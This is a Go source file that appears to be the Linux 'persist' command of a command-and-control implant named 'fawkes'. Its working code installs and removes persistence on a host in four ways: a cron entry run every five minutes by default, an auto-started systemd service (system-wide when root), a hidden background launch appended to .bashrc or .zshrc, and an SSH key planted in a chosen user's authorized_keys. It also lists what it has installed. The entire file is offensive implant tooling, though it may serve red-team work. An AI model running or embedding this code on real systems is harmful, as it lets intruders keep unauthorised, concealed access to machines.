//go:build linux
// +build linux

package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type PersistCommand struct{}

func (c *PersistCommand) Name() string {
	return "persist"
}

func (c *PersistCommand) Description() string {
	return "Install or remove persistence mechanisms"
}

type persistArgs struct {
	Method  string `json:"method"`
	Action  string `json:"action"`
	Name    string `json:"name"`
	Path    string `json:"path"`
	Hive    string `json:"hive"`
	CLSID   string `json:"clsid"`
	Timeout string `json:"timeout"`
	// Linux-specific
	Schedule string `json:"schedule"` // crontab schedule expression (e.g., "*/5 * * * *")
	User     string `json:"user"`     // target user for crontab (default: current)
}

func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
	var args persistArgs

	if task.Params == "" {
		return errorResult("Error: parameters required (method, action, name, path)")
	}

	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if args.Action == "" {
		args.Action = "install"
	}

	switch strings.ToLower(args.Method) {
	case "crontab", "cron":
		return persistCrontab(args)
	case "systemd", "systemd-service":
		return persistSystemd(args)
	case "shell-profile", "shell", "bashrc":
		return persistShellProfile(args)
	case "ssh-key", "authorized-keys":
		return persistSSHKey(args)
	case "list":
		return persistLinuxList()
	default:
		return errorf("Unknown method: %s. Use: crontab, systemd, shell-profile, ssh-key, or list", args.Method)
	}
}

// persistCrontab installs or removes a crontab entry
func persistCrontab(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistCrontabInstall(args)
	case "remove":
		return persistCrontabRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistCrontabInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Schedule == "" {
		args.Schedule = "*/5 * * * *" // Default: every 5 minutes
	}

	// Build the crontab line with a marker comment for easy removal
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}
	cronLine := fmt.Sprintf("%s %s # %s", args.Schedule, args.Path, marker)

	// Get current crontab
	var currentCrontab string
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		// No existing crontab is OK
		currentCrontab = ""
	} else {
		currentCrontab = string(output)
	}

	// Check if entry already exists
	if strings.Contains(currentCrontab, marker) {
		return errorf("Crontab entry with marker '%s' already exists. Remove first or use a different name.", marker)
	}

	// Append the new entry
	newCrontab := currentCrontab
	if !strings.HasSuffix(newCrontab, "\n") && newCrontab != "" {
		newCrontab += "\n"
	}
	newCrontab += cronLine + "\n"

	// Install via pipe to crontab
	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(newCrontab)
	if out, err := installCmd.CombinedOutput(); err != nil {
		return errorf("Failed to install crontab: %v\n%s", err, string(out))
	}

	return successResult(fmt.Sprintf("Crontab persistence installed:\n  Schedule: %s\n  Command: %s\n  Marker: %s\n\nRemove with: persist -method crontab -action remove -name %s", args.Schedule, args.Path, marker, marker))
}

func persistCrontabRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	// Get current crontab
	cmd := exec.Command("crontab", "-l")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return errorResult("No crontab entries found")
	}

	// Filter out lines matching the marker
	lines := strings.Split(string(output), "\n")
	var filtered []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(line, "# "+marker) {
			removed++
			continue
		}
		filtered = append(filtered, line)
	}

	if removed == 0 {
		return errorf("No crontab entries found with marker '%s'", marker)
	}

	newCrontab := strings.Join(filtered, "\n")
	installCmd := exec.Command("crontab", "-")
	installCmd.Stdin = strings.NewReader(newCrontab)
	if out, err := installCmd.CombinedOutput(); err != nil {
		return errorf("Failed to update crontab: %v\n%s", err, string(out))
	}

	return successResult(fmt.Sprintf("Removed %d crontab entry/entries with marker '%s'", removed, marker))
}

// persistSystemd installs or removes a systemd user service
func persistSystemd(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistSystemdInstall(args)
	case "remove":
		return persistSystemdRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistSystemdInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (executable to persist) is required")
	}
	if args.Name == "" {
		args.Name = "fawkes-agent"
	}

	// Determine user vs system service
	isRoot := os.Getuid() == 0
	var serviceDir string
	if isRoot {
		serviceDir = "/etc/systemd/system"
	} else {
		home, _ := os.UserHomeDir()
		serviceDir = filepath.Join(home, ".config", "systemd", "user")
		os.MkdirAll(serviceDir, 0755)
	}

	serviceName := args.Name + ".service"
	servicePath := filepath.Join(serviceDir, serviceName)

	// Generate service unit
	unit := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=on-failure
RestartSec=30

[Install]
WantedBy=%s
`, args.Name, args.Path, func() string {
		if isRoot {
			return "multi-user.target"
		}
		return "default.target"
	}())

	if err := os.WriteFile(servicePath, []byte(unit), 0644); err != nil {
		return errorf("Failed to write service file: %v", err)
	}

	// Enable and start the service
	var enableCmd *exec.Cmd
	if isRoot {
		enableCmd = exec.Command("systemctl", "daemon-reload")
	} else {
		enableCmd = exec.Command("systemctl", "--user", "daemon-reload")
	}
	_, _ = enableCmd.CombinedOutput()

	var enableArgs []string
	if isRoot {
		enableArgs = []string{"systemctl", "enable", "--now", serviceName}
	} else {
		enableArgs = []string{"systemctl", "--user", "enable", "--now", serviceName}
	}
	startCmd := exec.Command(enableArgs[0], enableArgs[1:]...)
	if out, err := startCmd.CombinedOutput(); err != nil {
		return errorf("Service created at %s but failed to enable: %v\n%s", servicePath, err, string(out))
	}

	scope := "system"
	if !isRoot {
		scope = "user"
	}
	return successResult(fmt.Sprintf("Systemd persistence installed:\n  Service: %s (%s scope)\n  Path: %s\n  Executable: %s\n  Status: enabled + started\n\nRemove with: persist -method systemd -action remove -name %s", serviceName, scope, servicePath, args.Path, args.Name))
}

func persistSystemdRemove(args persistArgs) structs.CommandResult {
	if args.Name == "" {
		args.Name = "fawkes-agent"
	}

	serviceName := args.Name + ".service"
	isRoot := os.Getuid() == 0

	// Stop and disable
	var stopArgs []string
	if isRoot {
		stopArgs = []string{"systemctl", "disable", "--now", serviceName}
	} else {
		stopArgs = []string{"systemctl", "--user", "disable", "--now", serviceName}
	}
	stopCmd := exec.Command(stopArgs[0], stopArgs[1:]...)
	_, _ = stopCmd.CombinedOutput()

	// Remove the service file
	var serviceDir string
	if isRoot {
		serviceDir = "/etc/systemd/system"
	} else {
		home, _ := os.UserHomeDir()
		serviceDir = filepath.Join(home, ".config", "systemd", "user")
	}

	servicePath := filepath.Join(serviceDir, serviceName)
	if err := os.Remove(servicePath); err != nil {
		return errorf("Failed to remove %s: %v", servicePath, err)
	}

	// Daemon reload
	var reloadCmd *exec.Cmd
	if isRoot {
		reloadCmd = exec.Command("systemctl", "daemon-reload")
	} else {
		reloadCmd = exec.Command("systemctl", "--user", "daemon-reload")
	}
	_, _ = reloadCmd.CombinedOutput()

	return successResult(fmt.Sprintf("Removed systemd persistence: %s (%s)", serviceName, servicePath))
}

// persistShellProfile appends a command to a shell profile for login persistence
func persistShellProfile(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistShellProfileInstall(args)
	case "remove":
		return persistShellProfileRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistShellProfileInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (command to execute on login) is required")
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	home, _ := os.UserHomeDir()
	// Pick the most appropriate profile file
	profilePath := filepath.Join(home, ".bashrc")
	shell := os.Getenv("SHELL")
	if strings.Contains(shell, "zsh") {
		profilePath = filepath.Join(home, ".zshrc")
	}

	// Read existing content
	existing, _ := os.ReadFile(profilePath)
	content := string(existing)

	if strings.Contains(content, marker) {
		return errorf("Shell profile already contains marker '%s'. Remove first.", marker)
	}

	// Append with marker comments for clean removal
	entry := fmt.Sprintf("\n# BEGIN %s\nnohup %s >/dev/null 2>&1 &\n# END %s\n", marker, args.Path, marker)

	f, err := os.OpenFile(profilePath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return errorf("Failed to open %s: %v", profilePath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(entry); err != nil {
		return errorf("Failed to write to %s: %v", profilePath, err)
	}

	return successResult(fmt.Sprintf("Shell profile persistence installed:\n  File: %s\n  Command: %s\n  Marker: %s\n\nRemove with: persist -method shell-profile -action remove -name %s", profilePath, args.Path, marker, marker))
}

func persistShellProfileRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	home, _ := os.UserHomeDir()
	profiles := []string{
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".zshrc"),
		filepath.Join(home, ".profile"),
		filepath.Join(home, ".bash_profile"),
	}

	removed := 0
	for _, profilePath := range profiles {
		data, err := os.ReadFile(profilePath)
		if err != nil {
			continue
		}

		content := string(data)
		beginTag := fmt.Sprintf("# BEGIN %s", marker)
		endTag := fmt.Sprintf("# END %s", marker)

		if !strings.Contains(content, beginTag) {
			continue
		}

		// Remove the block between BEGIN and END markers (inclusive)
		lines := strings.Split(content, "\n")
		var filtered []string
		inBlock := false
		for _, line := range lines {
			if strings.Contains(line, beginTag) {
				inBlock = true
				continue
			}
			if strings.Contains(line, endTag) {
				inBlock = false
				continue
			}
			if !inBlock {
				filtered = append(filtered, line)
			}
		}

		newContent := strings.Join(filtered, "\n")
		if err := os.WriteFile(profilePath, []byte(newContent), 0644); err != nil {
			continue
		}
		removed++
	}

	if removed == 0 {
		return errorf("No shell profile entries found with marker '%s'", marker)
	}

	return successResult(fmt.Sprintf("Removed persistence from %d shell profile(s) with marker '%s'", removed, marker))
}

// persistSSHKey adds or removes an SSH authorized_keys entry
func persistSSHKey(args persistArgs) structs.CommandResult {
	switch args.Action {
	case "install":
		return persistSSHKeyInstall(args)
	case "remove":
		return persistSSHKeyRemove(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove", args.Action)
	}
}

func persistSSHKeyInstall(args persistArgs) structs.CommandResult {
	if args.Path == "" {
		return errorResult("Error: path (SSH public key string) is required")
	}

	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	// Determine target user
	targetHome, _ := os.UserHomeDir()
	if args.User != "" {
		u, err := user.Lookup(args.User)
		if err != nil {
			return errorf("User '%s' not found: %v", args.User, err)
		}
		targetHome = u.HomeDir
	}

	sshDir := filepath.Join(targetHome, ".ssh")
	os.MkdirAll(sshDir, 0700)
	authKeysPath := filepath.Join(sshDir, "authorized_keys")

	// Check if key already exists
	existing, _ := os.ReadFile(authKeysPath)
	if strings.Contains(string(existing), marker) {
		return errorf("authorized_keys already contains marker '%s'. Remove first.", marker)
	}

	// Append key with comment marker
	keyLine := fmt.Sprintf("%s %s\n", strings.TrimSpace(args.Path), marker)

	f, err := os.OpenFile(authKeysPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return errorf("Failed to open %s: %v", authKeysPath, err)
	}
	defer f.Close()

	if _, err := f.WriteString(keyLine); err != nil {
		return errorf("Failed to write to %s: %v", authKeysPath, err)
	}

	return successResult(fmt.Sprintf("SSH key persistence installed:\n  File: %s\n  Marker: %s\n\nRemove with: persist -method ssh-key -action remove -name %s", authKeysPath, marker, marker))
}

func persistSSHKeyRemove(args persistArgs) structs.CommandResult {
	marker := "fawkes"
	if args.Name != "" {
		marker = args.Name
	}

	targetHome, _ := os.UserHomeDir()
	if args.User != "" {
		u, err := user.Lookup(args.User)
		if err != nil {
			return errorf("User '%s' not found: %v", args.User, err)
		}
		targetHome = u.HomeDir
	}

	authKeysPath := filepath.Join(targetHome, ".ssh", "authorized_keys")
	data, err := os.ReadFile(authKeysPath)
	if err != nil {
		return errorf("Failed to read %s: %v", authKeysPath, err)
	}

	lines := strings.Split(string(data), "\n")
	var filtered []string
	removed := 0
	for _, line := range lines {
		if strings.Contains(line, marker) {
			removed++
			continue
		}
		filtered = append(filtered, line)
	}

	if removed == 0 {
		return errorf("No authorized_keys entries found with marker '%s'", marker)
	}

	if err := os.WriteFile(authKeysPath, []byte(strings.Join(filtered, "\n")), 0600); err != nil {
		return errorf("Failed to write %s: %v", authKeysPath, err)
	}

	return successResult(fmt.Sprintf("Removed %d SSH key(s) with marker '%s' from %s", removed, marker, authKeysPath))
}

// persistLinuxList lists all installed persistence methods
func persistLinuxList() structs.CommandResult {
	var sb strings.Builder
	sb.WriteString("=== INSTALLED PERSISTENCE (Linux) ===\n\n")

	// Check crontab
	sb.WriteString("[Crontab]\n")
	cmd := exec.Command("crontab", "-l")
	if output, err := cmd.CombinedOutput(); err == nil {
		lines := strings.Split(string(output), "\n")
		for _, line := range lines {
			if strings.TrimSpace(line) != "" && !strings.HasPrefix(strings.TrimSpace(line), "#") {
				sb.WriteString(fmt.Sprintf("  %s\n", line))
			}
		}
	} else {
		sb.WriteString("  (no crontab)\n")
	}

	// Check user systemd services
	sb.WriteString("\n[Systemd User Services]\n")
	home, _ := os.UserHomeDir()
	userServiceDir := filepath.Join(home, ".config", "systemd", "user")
	if entries, err := os.ReadDir(userServiceDir); err == nil {
		for _, e := range entries {
			if strings.HasSuffix(e.Name(), ".service") {
				sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
			}
		}
	} else {
		sb.WriteString("  (none found)\n")
	}

	// Check system services if root
	if os.Getuid() == 0 {
		sb.WriteString("\n[Systemd System Services (custom)]\n")
		if entries, err := os.ReadDir("/etc/systemd/system"); err == nil {
			for _, e := range entries {
				if strings.HasSuffix(e.Name(), ".service") && !strings.HasPrefix(e.Name(), "sys-") {
					sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
				}
			}
		}
	}

	// Check shell profiles for markers
	sb.WriteString("\n[Shell Profile Persistence]\n")
	profiles := []string{".bashrc", ".zshrc", ".profile", ".bash_profile"}
	found := false
	for _, p := range profiles {
		path := filepath.Join(home, p)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		if strings.Contains(string(data), "# BEGIN ") {
			sb.WriteString(fmt.Sprintf("  %s: contains persistence markers\n", path))
			found = true
		}
	}
	if !found {
		sb.WriteString("  (none found)\n")
	}

	// Check authorized_keys
	sb.WriteString("\n[SSH Authorized Keys]\n")
	authKeys := filepath.Join(home, ".ssh", "authorized_keys")
	if data, err := os.ReadFile(authKeys); err == nil {
		lines := strings.Split(string(data), "\n")
		count := 0
		for _, line := range lines {
			if strings.TrimSpace(line) != "" {
				count++
			}
		}
		sb.WriteString(fmt.Sprintf("  %s: %d keys\n", authKeys, count))
	} else {
		sb.WriteString("  (no authorized_keys)\n")
	}

	return successResult(sb.String())
}
